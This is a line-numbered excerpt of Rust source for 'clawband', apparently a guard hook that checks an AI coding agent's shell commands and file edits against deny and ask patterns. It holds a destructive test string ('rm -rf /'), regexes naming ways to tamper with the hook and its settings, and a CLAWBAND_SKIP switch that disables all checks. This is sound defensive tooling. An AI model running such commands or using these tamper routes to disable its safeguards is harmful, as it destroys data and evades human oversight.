343	    let caps = re.captures(command)?;
344	    let flags = &caps[1];
345	    // -c  → shell/python inline command string
346	    // -m  → python module (e.g. python3 -m pytest)
347	    // -e / --eval → node inline eval
348	    if Regex::new(r"(?:^|\s)-[a-zA-Z]*[cme][a-zA-Z]*(\s|$)")
349	        .unwrap()
350	        .is_match(flags)
351	    {
352	        return None;
353	    }
354	    let path_str = caps[2].trim().trim_matches('"').trim_matches('\'');
355	    // First token only — ignore script arguments after the path
356	    let path = path_str.split_whitespace().next()?;
357	    Some(path.to_string())
358	}
359	
360	fn scan_script_file(
361	    path: &str,
362	    deny_pats: &[Pattern],
363	    ask_pats: &[Pattern],
364	    allow_pats: &[Pattern],
365	) -> Option<(String, String)> {
366	    let content = fs::read_to_string(path).ok()?;
367	    let is_js = path.ends_with(".js")
368	        || path.ends_with(".mjs")
369	        || path.ends_with(".ts")
370	        || path.ends_with(".tsx");
371	    let is_lua = path.ends_with(".lua");
372	    let mut in_block_comment = false;
373	
374	    for (lineno, raw_line) in content.lines().enumerate() {
375	        let line = raw_line.trim();
376	        if line.is_empty() {
377	            continue;
378	        }
379	
380	        // JS/TS block comment state: /* ... */
381	        if is_js {
382	            if in_block_comment {
383	                if line.contains("*/") {
384	                    in_block_comment = false;
385	                }
386	                continue;
387	            }
388	            if line.starts_with("/*") {
389	                in_block_comment = !line.contains("*/");
390	                continue;
391	            }
392	            if line.starts_with("//") || line.starts_with('*') {
393	                continue;
394	            }
395	        }
396	
397	        // Lua comment state: --[[ ... ]] block comments and -- line comments
398	        if is_lua {
399	            if in_block_comment {
400	                if line.contains("]]") {
401	                    in_block_comment = false;
402	                }
403	                continue;
404	            }
405	            if line.starts_with("--[[") {
406	                in_block_comment = !line.contains("]]");
407	                continue;
408	            }
409	            if line.starts_with("--") {
410	                continue;
411	            }
412	        }
413	
414	        // Shell (#) and Python (#) and Perl (#) line comments
415	        if line.starts_with('#') {
416	            continue;
417	        }
418	
419	        // Reuse compound-command splitting so `foo && rm -rf /` is caught
420	        let clean = strip_safe_pipes(line);
421	        for segment in &split_segments(&clean) {
422	            if allow_pats.iter().any(|p| p.matches(segment)) {
423	                continue;
424	            }
425	            for pat in deny_pats {
426	                if pat.matches(segment) {
427	                    return Some((
428	                        "deny".into(),
429	                        format!(
430	                            "Blocked: '{}' in {}:{}: {}",
431	                            pat.label,
432	                            path,
433	                            lineno + 1,
434	                            segment
435	                        ),
436	                    ));
437	                }
438	            }
439	            for pat in ask_pats {
440	                if pat.matches(segment) {
441	                    return Some((
442	                        "ask".into(),
443	                        format!(
444	                            "Review before running — '{}' in {}:{}: {}\nTo always allow: clawband allow '{}'",
445	                            pat.label,
446	                            path,
447	                            lineno + 1,
448	                            segment,
449	                            pat.label
450	                        ),
451	                    ));
452	                }
453	            }
454	        }
455	    }
456	    None
457	}
458	
459	// ─── Git force push check ─────────────────────────────────────────────────────
460	
461	fn check_force_push(cmd: &str) -> Option<String> {
462	    // Only applies to git push commands
463	    if !Regex::new(r"(?i)\bgit\s+push\b").unwrap().is_match(cmd) {
464	        return None;
465	    }
466	    // Strip --force-with-lease (safe alternative) first
467	    let strip_fwl = Regex::new(r"(?i)--force-with-lease(?:=\S+)?").unwrap();
468	    let cleaned = strip_fwl.replace_all(cmd, "");
469	    // Then block --force or -f anywhere in the command
470	    if Regex::new(r"(?i)\s--force(\s|$)|\s-f(\s|$)")
471	        .unwrap()
472	        .is_match(&cleaned)
473	    {
474	        Some("Blocked: git push --force / -f (use --force-with-lease instead)".into())
475	    } else {
476	        None
477	    }
478	}
479	
480	// ─── Safe inline pipe stripping ───────────────────────────────────────────────
481	// Remove  | python3 -c "..."  and  | python3 -m mod  before pipe checks.
482	// These are visible inline code, not supply-chain risks.
483	
484	fn strip_safe_pipes(cmd: &str) -> String {
485	    let c = Regex::new(r"(?i)\|\s*(python3?|node)\s+-c\s+[^|;&`$]*").unwrap();
486	    let m = Regex::new(r"(?i)\|\s*(python3?|node)\s+-m\s+\S+").unwrap();
487	    let s = c.replace_all(cmd, "");
488	    m.replace_all(&s, "").into_owned()
489	}
490	
491	// ─── Compound command splitting ───────────────────────────────────────────────
492	// Split on &&, ||, ; and newlines.
493	// Single | is NOT a splitter — keeps pipe-to-interpreter in one segment.
494	// \; and \| are escaped before splitting so find -exec and regex patterns survive.
495	
496	fn split_segments(cmd: &str) -> Vec<String> {
497	    const ESC_SEMI: &str = "\x01S\x01";
498	    const ESC_PIPE: &str = "\x01P\x01";
499	    const SEP: &str = "\x01SEP\x01";
500	
501	    let s = cmd.replace("\\;", ESC_SEMI).replace("\\|", ESC_PIPE);
502	
503	    let splitter = Regex::new(r"[ \t]*(\|\||&&|;|\n)[ \t]*").unwrap();
504	    let s = splitter.replace_all(&s, SEP);
505	
506	    s.split(SEP)
507	        .map(|seg| seg.trim().replace(ESC_SEMI, "\\;").replace(ESC_PIPE, "\\|"))
508	        .filter(|s| !s.is_empty())
509	        .collect()
510	}
511	
512	// ─── PostToolUse breadcrumb ───────────────────────────────────────────────────
513	// Written by PreToolUse when decision is "ask". Read and deleted by `clawband post`
514	// (PostToolUse hook). If the command ran, PostToolUse fires and we know the user
515	// approved. If denied, PostToolUse never fires and the breadcrumb expires via TTL.
516	
517	fn breadcrumb_path() -> PathBuf {
518	    config_dir().join(".last-ask")
519	}
520	
521	fn write_ask_breadcrumb(reason: &str) {
522	    let cfg = config_dir();
523	    let _ = fs::create_dir_all(&cfg);
524	    let ts = std::time::SystemTime::now()
525	        .duration_since(std::time::UNIX_EPOCH)
526	        .map(|d| d.as_secs())
527	        .unwrap_or(0);
528	    if let Ok(mut f) = fs::OpenOptions::new()
529	        .write(true)
530	        .create(true)
531	        .truncate(true)
532	        .open(breadcrumb_path())
533	    {
534	        let _ = writeln!(f, "{}\n{}", ts, reason);
535	    }
536	}
537	
538	fn cmd_post() {
539	    let path = breadcrumb_path();
540	    let Ok(content) = fs::read_to_string(&path) else {
541	        return;
542	    };
543	    let _ = fs::remove_file(&path);
544	
545	    let mut lines = content.lines();
546	    let ts: u64 = lines.next().and_then(|l| l.parse().ok()).unwrap_or(0);
547	
548	    let now = std::time::SystemTime::now()
549	        .duration_since(std::time::UNIX_EPOCH)
550	        .map(|d| d.as_secs())
551	        .unwrap_or(0);
552	    if now.saturating_sub(ts) > 60 {
553	        return;
554	    }
555	
556	    let reason: String = lines.collect::<Vec<_>>().join("\n");
557	
558	    // Extract "clawband allow '<label>'" from the hint line if present.
559	    if let Some(pos) = reason.find("clawband allow '") {
560	        let snippet = reason[pos..].lines().next().unwrap_or("").trim();
561	        println!(
562	            "The user approved a clawband-prompted command. \
563	             Suggest they run `{}` to stop being prompted for this in future.",
564	            snippet
565	        );
566	    }
567	}
568	
569	// ─── Allow / deny commands ───────────────────────────────────────────────────
570	
571	fn cmd_add_pattern(file: &str, args: &[String]) {
572	    if args.is_empty() {
573	        eprintln!("Usage: clawband allow|deny [--project] <pattern>");
574	        std::process::exit(1);
575	    }
576	
577	    let (use_project, pattern_args) = if args[0] == "--project" {
578	        if args.len() < 2 {
579	            eprintln!("Usage: clawband allow|deny [--project] <pattern>");
580	            std::process::exit(1);
581	        }
582	        (true, &args[1..])
583	    } else {
584	        (false, args)
585	    };
586	
587	    let pattern = pattern_args.join(" ");
588	
589	    if Pattern::from_user(&pattern).is_none() {
590	        eprintln!("clawband: invalid regex: {}", pattern);
591	        std::process::exit(1);
592	    }
593	
594	    let cfg = if use_project {
595	        PathBuf::from(env::var("PWD").unwrap_or_else(|_| ".".to_string())).join(".clawband")
596	    } else {
597	        config_dir()
598	    };
599	    let _ = fs::create_dir_all(&cfg);
600	    let path = cfg.join(file);
601	
602	    match fs::OpenOptions::new().append(true).create(true).open(&path) {
603	        Ok(mut f) => {
604	            let _ = writeln!(f, "{}", pattern);
605	            let g = "\x1b[32m";
606	            let b = "\x1b[34m";
607	            let r = "\x1b[0m";
608	            let bold = "\x1b[1m";
609	            println!(
610	                "{}Added{} {}{}{} → {}{}{}",
611	                g,
612	                r,
613	                bold,
614	                pattern,
615	                r,
616	                b,
617	                path.display(),
618	                r
619	            );
620	        }
621	        Err(e) => {
622	            eprintln!("clawband: failed to write {}: {}", path.display(), e);
623	            std::process::exit(1);
624	        }
625	    }
626	}
627	
628	// ─── Protected-paths config ───────────────────────────────────────────────────
629	
630	/// Expand a leading `~/` or `~` to `$HOME/`.
631	fn expand_home(s: &str) -> String {
632	    let home = env::var("HOME").unwrap_or_default();
633	    if let Some(rest) = s.strip_prefix("~/") {
634	        format!("{}/{}", home, rest)
635	    } else if s == "~" {
636	        home
637	    } else {
638	        s.to_string()
639	    }
640	}
641	
642	/// Load protect.paths from a directory.  Each line is a case-insensitive regex
643	/// matched against the absolute target file path.  A leading `~/` is expanded
644	/// to `$HOME/` before compilation.
645	fn load_protect_patterns(dir: &std::path::Path) -> Vec<Pattern> {
646	    let path = dir.join("protect.paths");
647	    let Ok(text) = fs::read_to_string(&path) else {
648	        return vec![];
649	    };
650	    text.lines()
651	        .map(str::trim)
652	        .filter(|l| !l.is_empty() && !l.starts_with('#'))
653	        .map(expand_home)
654	        .filter_map(|l| Pattern::from_user(&l))
655	        .collect()
656	}
657	
658	/// Collect protect patterns from global (~/.clawband/) and project (.clawband/)
659	/// protect.paths files.
660	fn protect_patterns() -> Vec<Pattern> {
661	    let mut pats = load_protect_patterns(&config_dir());
662	    if let Some(proj) = project_config_dir() {
663	        pats.extend(load_protect_patterns(&proj));
664	    }
665	    pats
666	}
667	
668	/// Returns true if at least one protect.paths file exists (global or project).
669	fn protect_active() -> bool {
670	    let global = config_dir().join("protect.paths");
671	    if global.exists() {
672	        return true;
673	    }
674	    if let Some(proj) = project_config_dir() {
675	        if proj.join("protect.paths").exists() {
676	            return true;
677	        }
678	    }
679	    false
680	}
681	
682	/// Check whether an edit target path matches any protect pattern.
683	/// Pure helper (testable without env/FS — pass patterns in directly).
684	fn edit_protected(path: &str, pats: &[Pattern]) -> bool {
685	    pats.iter().any(|p| p.matches(path))
686	}
687	
688	/// Resolve symlinks for an edit target, returning a list of candidate paths to
689	/// check against protect patterns.  The original expanded-absolute path is
690	/// always first; the canonicalized path (symlinks resolved, `..` collapsed) is
691	/// added as a second candidate when it differs.  For a path that doesn't exist
692	/// yet (e.g. a new file being created), we canonicalize the parent directory
693	/// and re-append the filename so that a symlinked parent is still resolved.
694	fn edit_candidates(abs_path: &str) -> Vec<String> {
695	    let mut candidates: Vec<String> = vec![abs_path.to_string()];
696	    let p = std::path::Path::new(abs_path);
697	
698	    let canon = if p.exists() {
699	        fs::canonicalize(p).ok()
700	    } else {
701	        // Path doesn't exist yet — canonicalize its parent and re-join the filename
702	        p.parent()
703	            .and_then(|parent| fs::canonicalize(parent).ok())
704	            .and_then(|canon_parent| p.file_name().map(|name| canon_parent.join(name)))
705	    };
706	
707	    if let Some(c) = canon {
708	        let cs = c.to_string_lossy().into_owned();
709	        if cs != abs_path {
710	            candidates.push(cs);
711	        }
712	    }
713	
714	    candidates
715	}
716	
717	/// Self-protect deny patterns added to the Bash check when protect_active().
718	/// These block shell commands that would tamper with clawband's own files.
719	/// They are anchored to specific file locations so they do NOT match
720	/// `brew upgrade clawband`, `clawband install`, or `bash install.sh`.
721	fn self_protect_deny_patterns() -> Vec<Pattern> {
722	    let specs: &[(&str, &str)] = &[
723	        // rm / mv / shred / truncate referencing clawband files
724	        (
725	            "rm clawband hook",
726	            r"\b(?:rm|mv|shred)\b[^|;&\n]*\.claude/hooks/clawband\b",
727	        ),
728	        (
729	            "rm clawband settings",
730	            r"\b(?:rm|mv|shred)\b[^|;&\n]*\.claude/settings\.json\b",
731	        ),
732	        (
733	            "rm clawband dir",
734	            r"\b(?:rm|mv|shred|truncate)\b[^|;&\n]*\.clawband/",
735	        ),
736	        (
737	            "truncate clawband hook",
738	            r"\btruncate\b[^|;&\n]*\.claude/hooks/clawband\b",
739	        ),
740	        (
741	            "truncate clawband settings",
742	            r"\btruncate\b[^|;&\n]*\.claude/settings\.json\b",
743	        ),
744	        // Output redirection > or >> to clawband files
745	        (
746	            "redirect to clawband hook",
747	            r">+\s*[^\n]*\.claude/hooks/clawband\b",
748	        ),
749	        (
750	            "redirect to clawband settings",
751	            r">+\s*[^\n]*\.claude/settings\.json\b",
752	        ),
753	        // sed -i targeting settings.json
754	        (
755	            "sed -i clawband settings",
756	            r"\bsed\b[^|;&\n]*-i[^|;&\n]*\.claude/settings\.json\b",
757	        ),
758	        // tee targeting settings.json
759	        (
760	            "tee clawband settings",
761	            r"\btee\b[^|;&\n]*\.claude/settings\.json\b",
762	        ),
763	        // chmod -x removing execute from the hook binary
764	        (
765	            "chmod -x clawband hook",
766	            r"\bchmod\b[^|;&\n]*-[a-zA-Z]*x[^|;&\n]*\.claude/hooks/clawband\b",
767	        ),
768	    ];
769	    specs.iter().map(|(l, p)| Pattern::builtin(l, p)).collect()
770	}

772	// ─── Install / verify ─────────────────────────────────────────────────────────
773	
774	const DENY_EXAMPLE: &str = include_str!("../deny.patterns.example");
775	const ASK_EXAMPLE: &str = include_str!("../ask.patterns.example");
776	const ALLOW_TEMPLATE: &str = "# allow.patterns — patterns that override deny/ask blocks\n\
777	# One pattern per line. Case-insensitive regex. Lines starting with # ignored.\n\
778	#\n\
779	# Example: allow git reset --hard only to HEAD\n\
780	# git reset --hard HEAD$\n";
781	
782	const PROTECT_PATHS_TEMPLATE: &str =
783	    "# protect.paths — clawband denies Write/Edit (and tamper Bash ops) on matching paths.\n\
784	# One regex per line, matched case-insensitively against the absolute file path.\n\
785	# A leading ~/ is expanded to your home directory.\n\
786	~/.claude/settings\\.json$\n\
787	~/.claude/hooks/clawband$\n\
788	~/.clawband/.*\n";
789	
790	fn settings_path() -> PathBuf {
791	    PathBuf::from(env::var("HOME").unwrap_or_default()).join(".claude/settings.json")
792	}
793	
794	// The command string to register in settings.json. Prefer the bare name when
795	// clawband is resolvable on PATH (stable across Homebrew upgrades); otherwise
796	// fall back to the absolute path of the running binary.
797	fn hook_command_string() -> String {
798	    if let Ok(exe) = env::current_exe() {
799	        if let Ok(canon_exe) = fs::canonicalize(&exe) {
800	            if let Ok(path) = env::var("PATH") {
801	                for dir in path.split(':') {
802	                    let candidate = PathBuf::from(dir).join("clawband");
803	                    if let Ok(canon) = fs::canonicalize(&candidate) {
804	                        if canon == canon_exe {
805	                            return "clawband".to_string();
806	                        }
807	                    }
808	                }
809	            }
810	        }
811	        return exe.to_string_lossy().into_owned();
812	    }
813	    "clawband".to_string()
814	}
815	
816	// Precisely identifies the clawband MAIN hook command — by executable basename,
817	// not substring. Excludes the `clawband post` companion. Robust against paths
818	// that happen to contain "icm"/"sqz" and against bare vs absolute forms.
819	fn is_clawband_main_command(cmd: &str) -> bool {
820	    let mut toks = cmd.split_whitespace();
821	    let Some(first) = toks.next() else {
822	        return false;
823	    };
824	    let base = first.rsplit('/').next().unwrap_or(first);
825	    if base != "clawband" {
826	        return false;
827	    }
828	    // `clawband post` is the PostToolUse companion, not the main hook
829	    toks.next() != Some("post")
830	}
831	
832	// Returns true if at least one clawband main hook is registered anywhere in PreToolUse.
833	fn clawband_hook_present(settings: &serde_json::Value) -> bool {
834	    settings["hooks"]["PreToolUse"]
835	        .as_array()
836	        .map(|entries| {
837	            entries.iter().any(|e| {
838	                e["hooks"].as_array().is_some_and(|hooks| {
839	                    hooks
840	                        .iter()
841	                        .any(|h| h["command"].as_str().is_some_and(is_clawband_main_command))
842	                })
843	            })
844	        })
845	        .unwrap_or(false)
846	}
847	
848	// Register the clawband PreToolUse hook, normalising to exactly one instance.
849	// - Removes every existing clawband main hook (self-heals duplicates), dropping
850	//   any entry left empty.
851	// - Re-adds a single hook: prepended into an existing `Bash` matcher entry if one
852	//   exists (so clawband runs first and there's no parallel Bash section), else a
853	//   new entry at the front.
854	// Returns true if the resulting settings differ from the input (i.e. a write is
855	// warranted), false if it was already correct (idempotent).
856	fn register_hook(settings: &mut serde_json::Value, command: &str) -> bool {
857	    use serde_json::json;
858	    if !settings.is_object() {
859	        *settings = json!({});
860	    }
861	    let obj = settings.as_object_mut().unwrap();
862	    let hooks_obj = obj.entry("hooks").or_insert_with(|| json!({}));
863	    if !hooks_obj.is_object() {
864	        *hooks_obj = json!({});
865	    }
866	    let pre_val = hooks_obj
867	        .as_object_mut()
868	        .unwrap()
869	        .entry("PreToolUse")
870	        .or_insert_with(|| json!([]));
871	    if !pre_val.is_array() {
872	        *pre_val = json!([]);
873	    }
874	    let before = pre_val.clone();
875	    let pre = pre_val.as_array_mut().unwrap();
876	
877	    // Strip all existing clawband main hooks from every entry.
878	    for entry in pre.iter_mut() {
879	        if let Some(hs) = entry["hooks"].as_array_mut() {
880	            hs.retain(|h| !h["command"].as_str().is_some_and(is_clawband_main_command));
881	        }
882	    }
883	    // Drop entries whose hooks array is now empty (e.g. a former clawband-only entry).
884	    pre.retain(|e| e["hooks"].as_array().map(|h| !h.is_empty()).unwrap_or(true));
885	
886	    let hook = json!({"type": "command", "command": command});
887	    // Prefer merging into an existing Bash matcher entry over a parallel section.
888	    if let Some(bash) = pre
889	        .iter_mut()
890	        .find(|e| e["matcher"].as_str() == Some("Bash") && e["hooks"].is_array())
891	    {
892	        bash["hooks"].as_array_mut().unwrap().insert(0, hook);
893	    } else {
894	        pre.insert(0, json!({"matcher": "Bash", "hooks": [hook]}));
895	    }
896	
897	    *pre_val != before
898	}
899	
900	/// Register a second PreToolUse hook entry with matcher "Write|Edit|MultiEdit|NotebookEdit"
901	/// pointing at the same clawband main command.  Idempotent — does nothing if an entry
902	/// whose matcher contains "Edit" already has a clawband main command.
903	/// Returns true if the settings were modified.
904	fn register_edit_hook(settings: &mut serde_json::Value, command: &str) -> bool {
905	    use serde_json::json;
906	    if !settings.is_object() {
907	        *settings = json!({});
908	    }
909	    let obj = settings.as_object_mut().unwrap();
910	    let hooks_obj = obj.entry("hooks").or_insert_with(|| json!({}));
911	    if !hooks_obj.is_object() {
912	        *hooks_obj = json!({});
913	    }
914	    let pre_val = hooks_obj
915	        .as_object_mut()
916	        .unwrap()
917	        .entry("PreToolUse")
918	        .or_insert_with(|| json!([]));
919	    if !pre_val.is_array() {
920	        *pre_val = json!([]);
921	    }
922	    let before = pre_val.clone();
923	    let pre = pre_val.as_array_mut().unwrap();
924	
925	    // Check if an entry with an "Edit"-containing matcher already has a clawband main command.
926	    let already = pre.iter().any(|e| {
927	        let matcher = e["matcher"].as_str().unwrap_or("");
928	        matcher.contains("Edit")
929	            && e["hooks"].as_array().is_some_and(|hooks| {
930	                hooks
931	                    .iter()
932	                    .any(|h| h["command"].as_str().is_some_and(is_clawband_main_command))
933	            })
934	    });
935	    if already {
936	        return false;
937	    }
938	
939	    let hook = json!({"type": "command", "command": command});
940	    pre.push(json!({"matcher": "Write|Edit|MultiEdit|NotebookEdit", "hooks": [hook]}));
941	
942	    *pre_val != before
943	}

945	/// Returns true if the Write|Edit|MultiEdit|NotebookEdit protect hook is registered.
946	fn edit_hook_present(settings: &serde_json::Value) -> bool {
947	    settings["hooks"]["PreToolUse"]
948	        .as_array()
949	        .map(|entries| {
950	            entries.iter().any(|e| {
951	                let matcher = e["matcher"].as_str().unwrap_or("");
952	                matcher.contains("Edit")
953	                    && e["hooks"].as_array().is_some_and(|hooks| {
954	                        hooks
955	                            .iter()
956	                            .any(|h| h["command"].as_str().is_some_and(is_clawband_main_command))
957	                    })
958	            })
959	        })
960	        .unwrap_or(false)
961	}

963	fn cmd_install(extra_args: &[String]) {
964	    let protect = extra_args.iter().any(|a| a == "--protect");
965	
966	    let g = "\x1b[32m";
967	    let y = "\x1b[33m";
968	    let d = "\x1b[2m";
969	    let r = "\x1b[0m";
970	    let bold = "\x1b[1m";
971	
972	    // 1. Config dir + pattern templates
973	    let cfg = config_dir();
974	    let _ = fs::create_dir_all(&cfg);
975	    let seed = |name: &str, content: &str| {
976	        let p = cfg.join(name);
977	        if p.exists() {
978	            println!("  {d}exists{r}  {}", p.display());
979	        } else if fs::write(&p, content).is_ok() {
980	            println!("  {g}created{r} {}", p.display());
981	        } else {
982	            println!("  {y}failed{r} {}", p.display());
983	        }
984	    };
985	    println!("{bold}Config{r}");
986	    seed("deny.patterns", DENY_EXAMPLE);
987	    seed("ask.patterns", ASK_EXAMPLE);
988	    seed("allow.patterns", ALLOW_TEMPLATE);
989	
990	    // 2. Wire settings.json
991	    println!("\n{bold}Hook{r}");
992	    let path = settings_path();
993	    let _ = fs::create_dir_all(path.parent().unwrap_or(&PathBuf::from(".")));
994	    let mut settings: serde_json::Value = fs::read_to_string(&path)
995	        .ok()
996	        .and_then(|s| serde_json::from_str(&s).ok())
997	        .unwrap_or_else(|| serde_json::json!({}));
998	
999	    let command = hook_command_string();
1000	    if register_hook(&mut settings, &command) {
1001	        match serde_json::to_string_pretty(&settings) {
1002	            Ok(out) => {
1003	                if fs::write(&path, out + "\n").is_ok() {
1004	                    println!(
1005	                        "  {g}registered{r} PreToolUse Bash hook → {d}{}{r}",
1006	                        command
1007	                    );
1008	                    println!("  {d}in {}{r}", path.display());
1009	                } else {
1010	                    println!("  {y}failed to write {}{r}", path.display());
1011	                }
1012	            }
1013	            Err(_) => println!("  {y}failed to serialize settings{r}"),
1014	        }
1015	    } else {
1016	        println!("  {d}already registered in {}{r}", path.display());
1017	    }
1018	
1019	    // 3. Self-protect (--protect flag)
1020	    if protect {
1021	        println!("\n{bold}Self-protect{r}");
1022	
1023	        // Seed protect.paths if missing
1024	        let pp = cfg.join("protect.paths");
1025	        if pp.exists() {
1026	            println!("  {d}exists{r}  {}", pp.display());
1027	        } else if fs::write(&pp, PROTECT_PATHS_TEMPLATE).is_ok() {
1028	            println!("  {g}created{r} {}", pp.display());
1029	        } else {
1030	            println!("  {y}failed{r} to create {}", pp.display());
1031	        }
1032	
1033	        // Re-read settings (may have been written above)
1034	        let mut settings2: serde_json::Value = fs::read_to_string(&path)
1035	            .ok()
1036	            .and_then(|s| serde_json::from_str(&s).ok())
1037	            .unwrap_or_else(|| serde_json::json!({}));
1038	
1039	        if register_edit_hook(&mut settings2, &command) {
1040	            match serde_json::to_string_pretty(&settings2) {
1041	                Ok(out) => {
1042	                    if fs::write(&path, out + "\n").is_ok() {
1043	                        println!(
1044	                            "  {g}registered{r} PreToolUse Write|Edit|MultiEdit|NotebookEdit hook → {d}{}{r}",
1045	                            command
1046	                        );
1047	                    } else {
1048	                        println!("  {y}failed to write {}{r}", path.display());
1049	                    }
1050	                }
1051	                Err(_) => println!("  {y}failed to serialize settings{r}"),
1052	            }
1053	        } else {
1054	            println!("  {d}edit hook already registered{r}");
1055	        }
1056	
1057	        println!();
1058	        println!("  Self-protect is now active.");
1059	        println!("  Claude's Write/Edit tools are guarded against modifying protected paths.");
1060	        println!("  Your own terminal is unaffected — only Claude Code's tools are guarded.");
1061	        println!(
1062	            "  Edit {}{}/protect.paths{r} to customise protected paths.",
1063	            d,
1064	            cfg.display(),
1065	            r = r
1066	        );
1067	    }
1068	
1069	    println!("\n{g}Done.{r} Run {bold}/hooks{r} in Claude Code (or restart) to activate.");
1070	    println!("{d}Verify anytime with: clawband verify{r}");
1071	}

1073	fn cmd_verify() -> i32 {
1074	    let g = "\x1b[32m";
1075	    let y = "\x1b[33m";
1076	    let red = "\x1b[31m";
1077	    let d = "\x1b[2m";
1078	    let r = "\x1b[0m";
1079	    let bold = "\x1b[1m";
1080	    let ok = format!("{g}✓{r}");
1081	    let warn = format!("{y}!{r}");
1082	    let bad = format!("{red}✗{r}");
1083	
1084	    let mut failures = 0;
1085	    println!("\n{bold}clawband verify{r}\n");
1086	
1087	    // 1. Binary
1088	    match env::current_exe() {
1089	        Ok(p) => println!("  {ok} binary: {d}{}{r}", p.display()),
1090	        Err(_) => {
1091	            println!("  {bad} binary: could not resolve path");
1092	            failures += 1;
1093	        }
1094	    }
1095	
1096	    // 2. settings.json hook
1097	    let sp = settings_path();
1098	    let settings: Option<serde_json::Value> = fs::read_to_string(&sp)
1099	        .ok()
1100	        .and_then(|s| serde_json::from_str(&s).ok());
1101	    match &settings {
1102	        Some(v) if clawband_hook_present(v) => {
1103	            println!("  {ok} hook registered in {d}{}{r}", sp.display())
1104	        }
1105	        Some(_) => {
1106	            println!("  {bad} hook NOT registered — run: clawband install");
1107	            failures += 1;
1108	        }
1109	        None => {
1110	            println!("  {bad} {} missing or invalid JSON", sp.display());
1111	            failures += 1;
1112	        }
1113	    }
1114	
1115	    // 3. Config dir
1116	    let cfg = config_dir();
1117	    if cfg.exists() {
1118	        println!("  {ok} config dir: {d}{}{r}", cfg.display());
1119	    } else {
1120	        println!(
1121	            "  {warn} no config dir at {} {d}(built-in patterns still active){r}",
1122	            cfg.display()
1123	        );
1124	    }
1125	
1126	    // 4. CLAWBAND_SKIP
1127	    if env::var("CLAWBAND_SKIP").as_deref() == Ok("1") {
1128	        println!("  {bad} {red}{bold}CLAWBAND_SKIP=1 — ALL CHECKS DISABLED{r}");
1129	        failures += 1;
1130	    } else {
1131	        println!("  {ok} CLAWBAND_SKIP not set");
1132	    }
1133	
1134	    // 5. Self-test: prove the engine blocks and passes correctly
1135	    let dp = builtin_deny();
1136	    let ap = builtin_ask();
1137	    let no_allow: Vec<Pattern> = vec![];
1138	    let blocks = check_command("rm -rf /", &dp, &ap, &no_allow)
1139	        .map(|(d, _)| d == "deny")
1140	        .unwrap_or(false);
1141	    let passes = check_command("ls -la", &dp, &ap, &no_allow).is_none();
1142	    if blocks && passes {
1143	        println!("  {ok} self-test: engine blocks destructive + passes safe commands");
1144	    } else {
1145	        println!("  {bad} self-test FAILED (blocks={blocks}, passes={passes})");
1146	        failures += 1;
1147	    }
1148	
1149	    // 6. Self-protect status (informational — no failure if off)
1150	    let sp_paths_active = protect_active();
1151	    let sp_hook_active = settings.as_ref().map(edit_hook_present).unwrap_or(false);
1152	    if sp_paths_active && sp_hook_active {
1153	        println!("  {ok} self-protect: active (protect.paths + Write/Edit hook registered)");
1154	    } else if !sp_paths_active && !sp_hook_active {
1155	        println!("  {d}self-protect: off{r}  {d}(run: clawband install --protect to enable){r}");
1156	    } else {
1157	        println!(
1158	            "  {warn} self-protect: partial (paths_active={sp_paths_active}, edit_hook={sp_hook_active})"
1159	        );
1160	    }
1161	
1162	    if failures == 0 {
1163	        println!("\n{g}{bold}All checks passed.{r} clawband is active.\n");
1164	        0
1165	    } else {
1166	        println!("\n{red}{bold}{failures} check(s) failed.{r} See above.\n");
1167	        1
1168	    }
1169	}

1185	        std::process::exit(1);

1188	    let command = command_args.join(" ");
1189	
1190	    // Load the same pattern set as main()

1201	    }
1202	    if protect_active() {
1203	        deny_pats.extend(self_protect_deny_patterns());
1204	    }
1205	
1206	    match check_command(&command, &deny_pats, &ask_pats, &allow_pats) {
1207	        Some(("deny", reason)) => {
1208	            println!("\n  {red}{bold}DENY{r}  {d}{}{r}\n", reason);
1209	        }
1210	        Some((_, reason)) => {
1211	            println!("\n  {y}{bold}ASK{r}   {d}{}{r}\n", reason);
1212	        }
1213	        None => {
1214	            println!("\n  {g}{bold}PASS{r}  {d}command would run{r}\n");
1215	        }
1216	    }
1217	}

1312	fn cmd_log(args: &[String]) {
1313	    let g = "\x1b[32m";
1314	    let y = "\x1b[33m";
1315	    let red = "\x1b[31m";
1316	    let d = "\x1b[2m";
1317	    let r = "\x1b[0m";
1318	    let bold = "\x1b[1m";
1319	    let path = log_path();
1320	
1321	    match args.first().map(|s| s.as_str()) {
1322	        Some("--enable") => {
1323	            let _ = fs::create_dir_all(config_dir());
1324	            match fs::write(log_marker(), "") {
1325	                Ok(_) => println!(
1326	                    "{g}Logging enabled.{r} Every block/prompt is appended to {}",
1327	                    path.display()
1328	                ),
1329	                Err(e) => {
1330	                    eprintln!("clawband: failed to enable logging: {e}");
1331	                    std::process::exit(1);
1332	                }
1333	            }
1334	            return;
1335	        }
1336	        Some("--disable") => {
1337	            let _ = fs::remove_file(log_marker());
1338	            println!(
1339	                "{y}Logging disabled.{r} {d}(CLAWBAND_LOG=1 in your env would still enable it.){r}"
1340	            );
1341	            return;
1342	        }
1343	        Some("--clear") => {
1344	            match fs::write(&path, "") {
1345	                Ok(_) => println!("{g}Cleared{r} {}", path.display()),
1346	                Err(e) => {
1347	                    eprintln!("clawband: failed to clear log: {e}");
1348	                    std::process::exit(1);
1349	                }
1350	            }
1351	            return;
1352	        }
1353	        Some("--path") => {
1354	            println!("{}", path.display());
1355	            return;
1356	        }
1357	        _ => {}
1358	    }
1359	
1360	    // Default: show recent entries. `-n N` overrides the count (default 50).
1361	    let mut n = 50usize;
1362	    let mut i = 0;
1363	    while i < args.len() {
1364	        if args[i] == "-n" {
1365	            if let Some(v) = args.get(i + 1).and_then(|s| s.parse::<usize>().ok()) {
1366	                n = v;
1367	                i += 2;
1368	                continue;
1369	            }
1370	        }
1371	        i += 1;
1372	    }
1373	
1374	    if !path.exists() {
1375	        if logging_enabled() {
1376	            println!("{d}Logging is on, but nothing has been recorded yet.{r}");
1377	        } else {
1378	            println!(
1379	                "{d}Logging is off.{r} Enable it with: {bold}clawband log --enable{r}  {d}(or set CLAWBAND_LOG=1){r}"
1380	            );
1381	        }
1382	        return;
1383	    }
1384	
1385	    let content = fs::read_to_string(&path).unwrap_or_default();
1386	    let lines = tail_lines(&content, n);
1387	    let total = content.lines().filter(|l| !l.trim().is_empty()).count();
1388	    println!(
1389	        "\n{bold}clawband log{r}  {d}({} — showing last {} of {}){r}\n",
1390	        path.display(),
1391	        lines.len(),
1392	        total
1393	    );
1394	    for line in &lines {
1395	        let coloured = if line.contains("] DENY |") || line.contains("] SKIP |") {
1396	            format!("{red}{line}{r}")
1397	        } else if line.contains("] ASK |") {
1398	            format!("{y}{line}{r}")
